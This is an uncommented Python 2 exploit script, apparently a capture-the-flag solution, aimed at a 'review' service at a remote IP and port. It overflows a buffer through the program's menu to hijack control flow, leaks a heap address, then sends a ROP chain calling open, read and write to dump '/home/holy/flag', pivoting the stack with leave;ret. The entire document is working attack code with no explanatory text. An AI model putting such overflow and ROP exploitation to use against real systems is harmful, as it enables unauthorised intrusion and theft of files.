import pwnbox,struct
pack = lambda x: struct.pack("<I",x)
unpack = lambda x: struct.unpack("<I",x)[0]
#p = pwnbox.pipe.ProcessPipe("/home/holy/review")
p = pwnbox.pipe.SocketPipe("1.224.175.28", 10040)
MAIN = 0x08048F74
def end():
  p.read_until(">>>")

def create_review(cat,num,reviews):
  end()
  p.write("1\n")
  end()
  p.write(cat)
  end()
  p.write("%d\n"%num)
  for i in range(num):
    end()
    p.write(reviews[i][0])
    p.read_until("(N)")
    p.write("Y\n")
    p.read_until("commet.")
    p.write(reviews[i][1])


def admin(pw):
  end()
  p.write("%\n")
  p.read_until("password :")
  p.write(pw)

def over(data):
  end()
  p.write("3\n")
  end()
  p.write("0\n")
  p.read_until("\n")
  p.write(data)
def call(f,n,a):
  over("A"*14+pack(MAIN)+"CCCC\n")
  admin(pack(f)+pack(n)+"CC\n")
  over("A"*10+pack(a)+pack(0x08049193)+pack(0x08055af3)+"\n")
  admin("G"*10+"\n")
  p.read_until("Your not admin...\n")
  return p.read_until("\n")


create_review("A"*0x30,100,[("A"*0x1d,"B"*0x63),]*100)
heap = unpack(call(0x08050910,MAIN,0x080edf20)[:4])
print hex(heap)
buf = heap-0x40

#max 0x50
open_adr = 0x0806e250
pppr = 0x0804841d
flag = heap-4
read_adr = 0x806E2C0
write_adr = 0x0806e330
flag_adr = 0x080EE340
#open
rop =  pack(open_adr)
rop += pack(pppr)
rop += pack(flag)
rop += pack(0)
rop += pack(0)

rop += pack(read_adr)
rop += pack(pppr)
rop += pack(3)
rop += pack(flag_adr)
rop += pack(0x100)

rop += pack(write_adr)
rop += pack(pppr)
rop += pack(1)
rop += pack(flag_adr)
rop += pack(0x100)

#read
#write

pay = "B"*14
pay += pack(0x8048419)
pay += rop
pay += "/home/holy/flag\x00"
pay = pay.ljust(99,"X")
over(pay+"\n")
p.write("%\n")
esp = buf-4
leave_ret = 0x0804996b
admin(pack(esp)+pack(leave_ret)+"\n")
p.interact()

